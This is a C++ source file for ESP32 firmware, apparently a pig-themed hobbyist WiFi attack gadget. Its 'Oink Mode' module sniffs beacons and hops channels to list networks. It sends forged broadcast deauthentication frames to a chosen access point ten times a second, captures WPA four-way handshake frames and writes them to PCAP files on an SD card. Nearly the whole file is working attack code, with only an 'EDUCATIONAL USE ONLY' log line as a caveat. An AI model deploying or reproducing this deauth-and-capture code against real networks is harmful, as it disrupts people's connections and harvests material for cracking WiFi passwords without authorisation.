// Oink Mode implementation

#include "oink.h"
#include "../core/config.h"
#include "../ui/display.h"
#include "../piglet/mood.h"
#include "../ml/inference.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SPI.h>
#include <SD.h>

// Static members
bool OinkMode::running = false;
bool OinkMode::scanning = false;
bool OinkMode::deauthing = false;
bool OinkMode::channelHopping = true;
uint8_t OinkMode::currentChannel = 1;
uint32_t OinkMode::lastHopTime = 0;
uint32_t OinkMode::lastScanTime = 0;
std::vector<DetectedNetwork> OinkMode::networks;
std::vector<CapturedHandshake> OinkMode::handshakes;
int OinkMode::targetIndex = -1;
uint32_t OinkMode::packetCount = 0;
uint32_t OinkMode::deauthCount = 0;

// Channel hop order (most common channels first)
const uint8_t CHANNEL_HOP_ORDER[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
const uint8_t CHANNEL_COUNT = sizeof(CHANNEL_HOP_ORDER);
uint8_t currentHopIndex = 0;

void OinkMode::init() {
    networks.clear();
    handshakes.clear();
    targetIndex = -1;
    packetCount = 0;
    deauthCount = 0;
    
    Serial.println("[OINK] Initialized");
}

void OinkMode::start() {
    if (running) return;
    
    Serial.println("[OINK] Starting...");
    
    // Initialize WiFi in promiscuous mode
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    
    // Set channel
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    
    running = true;
    scanning = true;
    lastHopTime = millis();
    lastScanTime = millis();
    
    Display::setWiFiStatus(true);
    Serial.println("[OINK] Running");
}

void OinkMode::stop() {
    if (!running) return;
    
    Serial.println("[OINK] Stopping...");
    
    deauthing = false;
    scanning = false;
    
    esp_wifi_set_promiscuous(false);
    
    running = false;
    Display::setWiFiStatus(false);
    
    Serial.println("[OINK] Stopped");
}

void OinkMode::update() {
    if (!running) return;
    
    uint32_t now = millis();
    
    // Channel hopping
    if (channelHopping && !deauthing) {
        if (now - lastHopTime > Config::wifi().channelHopInterval) {
            hopChannel();
            lastHopTime = now;
        }
    }
    
    // Periodic network cleanup - remove stale entries
    if (now - lastScanTime > 30000) {
        for (auto it = networks.begin(); it != networks.end();) {
            if (now - it->lastSeen > 60000) {
                it = networks.erase(it);
            } else {
                ++it;
            }
        }
        lastScanTime = now;
    }
}

void OinkMode::startScan() {
    scanning = true;
    channelHopping = true;
    currentHopIndex = 0;
    Serial.println("[OINK] Scan started");
}

void OinkMode::stopScan() {
    scanning = false;
    Serial.println("[OINK] Scan stopped");
}

void OinkMode::selectTarget(int index) {
    if (index >= 0 && index < (int)networks.size()) {
        targetIndex = index;
        networks[index].isTarget = true;
        
        // Lock to target's channel
        channelHopping = false;
        setChannel(networks[index].channel);
        
        Serial.printf("[OINK] Target selected: %s\n", networks[index].ssid);
    }
}

void OinkMode::clearTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
        networks[targetIndex].isTarget = false;
    }
    targetIndex = -1;
    channelHopping = true;
    Serial.println("[OINK] Target cleared");
}

DetectedNetwork* OinkMode::getTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
        return &networks[targetIndex];
    }
    return nullptr;
}

void OinkMode::startDeauth() {
    if (!running || targetIndex < 0) return;
    
    deauthing = true;
    channelHopping = false;
    Serial.println("[OINK] Deauth started (EDUCATIONAL USE ONLY)");
}

void OinkMode::stopDeauth() {
    deauthing = false;
    Serial.println("[OINK] Deauth stopped");
}

void OinkMode::setChannel(uint8_t ch) {
    if (ch < 1 || ch > 14) return;
    currentChannel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void OinkMode::enableChannelHop(bool enable) {
    channelHopping = enable;
}

void OinkMode::hopChannel() {
    currentHopIndex = (currentHopIndex + 1) % CHANNEL_COUNT;
    currentChannel = CHANNEL_HOP_ORDER[currentHopIndex];
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

void OinkMode::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!running) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;
    
    if (len < 24) return;  // Minimum 802.11 header
    
    packetCount++;
    
    const uint8_t* payload = pkt->payload;
    uint8_t frameType = (payload[0] >> 2) & 0x03;
    uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;
    
    switch (type) {
        case WIFI_PKT_MGMT:
            if (frameSubtype == 0x08) {  // Beacon
                processBeacon(payload, len, rssi);
            }
            break;
            
        case WIFI_PKT_DATA:
            processDataFrame(payload, len, rssi);
            break;
            
        default:
            break;
    }
    
    // If deauthing, periodically send deauth frames
    if (deauthing && targetIndex >= 0) {
        static uint32_t lastDeauth = 0;
        uint32_t now = millis();
        
        if (now - lastDeauth > 100) {  // 10 deauths per second
            DetectedNetwork* target = &networks[targetIndex];
            // Broadcast deauth
            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            sendDeauthFrame(target->bssid, broadcast, 7);  // Reason: Class 3 frame
            deauthCount++;
            lastDeauth = now;
        }
    }
}

void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 36) return;
    
    // BSSID is at offset 16
    const uint8_t* bssid = payload + 16;
    
    int idx = findNetwork(bssid);
    
    if (idx < 0) {
        // New network
        DetectedNetwork net = {0};
        memcpy(net.bssid, bssid, 6);
        net.rssi = rssi;
        net.lastSeen = millis();
        net.beaconCount = 1;
        net.isTarget = false;
        
        // Parse SSID from IE
        uint16_t offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (offset + 2 + ieLen > len) break;
            
            if (id == 0 && ieLen > 0 && ieLen < 33) {
                memcpy(net.ssid, payload + offset + 2, ieLen);
                net.ssid[ieLen] = 0;
                break;
            }
            
            offset += 2 + ieLen;
        }
        
        // Extract features for ML
        net.features = FeatureExtractor::extractFromBeacon(payload, len, rssi);
        
        // Get channel from DS Parameter Set IE
        offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (id == 3 && ieLen == 1) {  // DS Parameter Set
                net.channel = payload[offset + 2];
                break;
            }
            
            offset += 2 + ieLen;
        }
        
        if (net.channel == 0) {
            net.channel = currentChannel;
        }
        
        networks.push_back(net);
        Mood::onNewNetwork(net.ssid);
        
        Serial.printf("[OINK] New network: %s (ch%d, %ddBm)\n", 
                     net.ssid[0] ? net.ssid : "<hidden>", net.channel, net.rssi);
    } else {
        // Update existing
        networks[idx].rssi = rssi;
        networks[idx].lastSeen = millis();
        networks[idx].beaconCount++;
    }
}

void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 28) return;
    
    // Check for EAPOL (LLC/SNAP header: AA AA 03 00 00 00 88 8E)
    // Data starts after 802.11 header (24 bytes for data frames)
    // May have QoS (2 bytes) and/or HTC (4 bytes)
    
    uint16_t offset = 24;
    
    // Check ToDS/FromDS flags
    uint8_t toDs = (payload[1] & 0x01);
    uint8_t fromDs = (payload[1] & 0x02) >> 1;
    
    // Adjust offset for address 4 if needed
    if (toDs && fromDs) offset += 6;
    
    // Check for QoS Data
    if ((payload[0] & 0x80) && (payload[0] & 0x08)) {
        offset += 2;
    }
    
    if (offset + 8 > len) return;
    
    // Check LLC/SNAP header for EAPOL
    if (payload[offset] == 0xAA && payload[offset+1] == 0xAA &&
        payload[offset+2] == 0x03 && payload[offset+3] == 0x00 &&
        payload[offset+4] == 0x00 && payload[offset+5] == 0x00 &&
        payload[offset+6] == 0x88 && payload[offset+7] == 0x8E) {
        
        // This is EAPOL!
        const uint8_t* srcMac = payload + 10;  // TA
        const uint8_t* dstMac = payload + 4;   // RA
        
        processEAPOL(payload + offset + 8, len - offset - 8, srcMac, dstMac);
    }
}

void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len, 
                             const uint8_t* srcMac, const uint8_t* dstMac) {
    if (len < 4) return;
    
    // EAPOL: version(1) + type(1) + length(2) + descriptor(...)
    uint8_t type = payload[1];
    
    if (type != 3) return;  // Only interested in EAPOL-Key
    
    if (len < 99) return;  // Minimum EAPOL-Key frame
    
    // Key info at offset 5-6
    uint16_t keyInfo = (payload[5] << 8) | payload[6];
    uint8_t keyType = (keyInfo >> 3) & 0x01;  // 0=Group, 1=Pairwise
    uint8_t install = (keyInfo >> 6) & 0x01;
    uint8_t keyAck = (keyInfo >> 7) & 0x01;
    uint8_t keyMic = (keyInfo >> 8) & 0x01;
    uint8_t secure = (keyInfo >> 9) & 0x01;
    
    uint8_t messageNum = 0;
    if (keyAck && !keyMic) messageNum = 1;
    else if (!keyAck && keyMic && !install) messageNum = 2;
    else if (keyAck && keyMic && install) messageNum = 3;
    else if (!keyAck && keyMic && secure) messageNum = 4;
    
    if (messageNum == 0) return;
    
    // Determine which is AP (sender of M1/M3) and station
    uint8_t bssid[6], station[6];
    if (messageNum == 1 || messageNum == 3) {
        memcpy(bssid, srcMac, 6);
        memcpy(station, dstMac, 6);
    } else {
        memcpy(bssid, dstMac, 6);
        memcpy(station, srcMac, 6);
    }
    
    // Find or create handshake entry
    int hsIdx = findOrCreateHandshake(bssid, station);
    if (hsIdx < 0) return;
    
    CapturedHandshake& hs = handshakes[hsIdx];
    
    // Store this frame
    uint8_t frameIdx = messageNum - 1;
    uint16_t copyLen = min((uint16_t)512, len);
    memcpy(hs.frames[frameIdx].data, payload, copyLen);
    hs.frames[frameIdx].len = copyLen;
    hs.frames[frameIdx].messageNum = messageNum;
    hs.frames[frameIdx].timestamp = millis();
    
    // Update mask
    hs.capturedMask |= (1 << frameIdx);
    hs.lastSeen = millis();
    
    // Look up SSID from networks if not set
    if (hs.ssid[0] == 0) {
        int netIdx = findNetwork(bssid);
        if (netIdx >= 0) {
            strncpy(hs.ssid, networks[netIdx].ssid, 32);
        }
    }
    
    Serial.printf("[OINK] EAPOL M%d captured! SSID:%s BSSID:%02X:%02X:%02X:%02X:%02X:%02X [%s%s%s%s]\n",
                 messageNum, 
                 hs.ssid[0] ? hs.ssid : "?",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                 hs.hasM1() ? "1" : "-",
                 hs.hasM2() ? "2" : "-",
                 hs.hasM3() ? "3" : "-",
                 hs.hasM4() ? "4" : "-");
    
    // Trigger mood on capture with AP name
    Mood::onHandshakeCaptured(hs.ssid);
    
    // Auto-save if we got a complete handshake
    if (hs.isComplete() && !hs.saved) {
        autoSaveCheck();
    }
}

int OinkMode::findOrCreateHandshake(const uint8_t* bssid, const uint8_t* station) {
    // Look for existing handshake with same BSSID+station pair
    for (int i = 0; i < (int)handshakes.size(); i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0 &&
            memcmp(handshakes[i].station, station, 6) == 0) {
            return i;
        }
    }
    
    // Create new entry
    CapturedHandshake hs = {0};
    memcpy(hs.bssid, bssid, 6);
    memcpy(hs.station, station, 6);
    hs.capturedMask = 0;
    hs.firstSeen = millis();
    hs.lastSeen = millis();
    hs.saved = false;
    
    handshakes.push_back(hs);
    return handshakes.size() - 1;
}

uint16_t OinkMode::getCompleteHandshakeCount() {
    uint16_t count = 0;
    for (const auto& hs : handshakes) {
        if (hs.isComplete()) count++;
    }
    return count;
}

void OinkMode::autoSaveCheck() {
    // Save any unsaved complete handshakes
    for (auto& hs : handshakes) {
        if (hs.isComplete() && !hs.saved) {
            // Generate filename
            char filename[64];
            snprintf(filename, sizeof(filename), "/handshakes/%02X%02X%02X%02X%02X%02X.pcap",
                    hs.bssid[0], hs.bssid[1], hs.bssid[2],
                    hs.bssid[3], hs.bssid[4], hs.bssid[5]);
            
            // Ensure directory exists
            if (!SD.exists("/handshakes")) {
                SD.mkdir("/handshakes");
            }
            
            if (saveHandshakePCAP(hs, filename)) {
                hs.saved = true;
                Serial.printf("[OINK] Handshake saved: %s\n", filename);
            }
        }
    }
}

// PCAP file format structures
#pragma pack(push, 1)
struct PCAPHeader {
    uint32_t magic;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t linktype;
};

struct PCAPPacketHeader {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
};
#pragma pack(pop)

void OinkMode::writePCAPHeader(fs::File& f) {
    PCAPHeader hdr = {
        .magic = 0xA1B2C3D4,      // PCAP magic
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = 65535,
        .linktype = 105           // LINKTYPE_IEEE802_11 (802.11)
    };
    f.write((uint8_t*)&hdr, sizeof(hdr));
}

void OinkMode::writePCAPPacket(fs::File& f, const uint8_t* data, uint16_t len, uint32_t ts) {
    PCAPPacketHeader pkt = {
        .ts_sec = ts / 1000,
        .ts_usec = (ts % 1000) * 1000,
        .incl_len = len,
        .orig_len = len
    };
    f.write((uint8_t*)&pkt, sizeof(pkt));
    f.write(data, len);
}

bool OinkMode::saveHandshakePCAP(const CapturedHandshake& hs, const char* path) {
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        Serial.printf("[OINK] Failed to create PCAP: %s\n", path);
        return false;
    }
    
    writePCAPHeader(f);
    
    // Build 802.11 data frame + EAPOL for each captured message
    // We need to reconstruct the full frame for PCAP
    
    for (int i = 0; i < 4; i++) {
        if (!(hs.capturedMask & (1 << i))) continue;
        
        const EAPOLFrame& frame = hs.frames[i];
        if (frame.len == 0) continue;
        
        // Build fake 802.11 Data frame header + LLC/SNAP + EAPOL
        uint8_t pkt[600];
        uint16_t pktLen = 0;
        
        // 802.11 Data frame header (24 bytes)
        pkt[0] = 0x08; pkt[1] = 0x02;  // Data frame, ToDS=1
        pkt[2] = 0x00; pkt[3] = 0x00;  // Duration
        
        // Addresses depend on message direction
        if (i == 0 || i == 2) {  // M1, M3: AP->Station
            memcpy(pkt + 4, hs.station, 6);   // DA
            memcpy(pkt + 10, hs.bssid, 6);    // BSSID
            memcpy(pkt + 16, hs.bssid, 6);    // SA
        } else {  // M2, M4: Station->AP
            memcpy(pkt + 4, hs.bssid, 6);     // DA (BSSID)
            memcpy(pkt + 10, hs.bssid, 6);    // BSSID
            memcpy(pkt + 16, hs.station, 6);  // SA
        }
        
        pkt[22] = 0x00; pkt[23] = 0x00;  // Sequence
        pktLen = 24;
        
        // LLC/SNAP header (8 bytes)
        pkt[24] = 0xAA; pkt[25] = 0xAA; pkt[26] = 0x03;
        pkt[27] = 0x00; pkt[28] = 0x00; pkt[29] = 0x00;
        pkt[30] = 0x88; pkt[31] = 0x8E;  // EAPOL ethertype
        pktLen = 32;
        
        // EAPOL data
        memcpy(pkt + 32, frame.data, frame.len);
        pktLen += frame.len;
        
        writePCAPPacket(f, pkt, pktLen, frame.timestamp);
    }
    
    f.close();
    return true;
}

bool OinkMode::saveAllHandshakes() {
    bool success = true;
    autoSaveCheck();  // This saves any unsaved ones
    return success;
}

void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    // Deauth frame structure
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,  // Frame Control: Deauth
        0x00, 0x00,  // Duration
        // Address 1 (Destination)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Address 2 (Source/BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Address 3 (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,  // Sequence
        0x07, 0x00   // Reason code
    };
    
    memcpy(deauthPacket + 4, station, 6);
    memcpy(deauthPacket + 10, bssid, 6);
    memcpy(deauthPacket + 16, bssid, 6);
    deauthPacket[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

int OinkMode::findNetwork(const uint8_t* bssid) {
    for (int i = 0; i < (int)networks.size(); i++) {
        if (memcmp(networks[i].bssid, bssid, 6) == 0) {
            return i;
        }
    }
    return -1;
}
